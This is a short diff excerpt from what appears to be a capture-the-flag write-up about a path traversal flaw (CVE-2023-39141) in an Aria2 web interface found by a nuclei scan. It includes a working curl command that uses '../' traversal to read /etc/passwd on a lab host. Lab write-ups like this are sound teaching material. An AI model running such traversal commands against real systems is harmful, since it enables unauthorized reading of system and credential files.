@@ -123,6 +123,7 @@ flags                   [Status: 500, Size: 82, Words: 9, Lines: 2, Duration: 18
 2. As per nuclei scan there are a couple of path traversal vulnerabilities one in particular marked as high CVE-2023-39141
 3. Searching for Aria2 and the CVE we can see the app is vulnerable, more about this here https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e
 4. To check the vulnerability we can run curl on /etc/passwd location:
+
 ```sh
 curl --path-as-is http://10.10.191.125:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
 
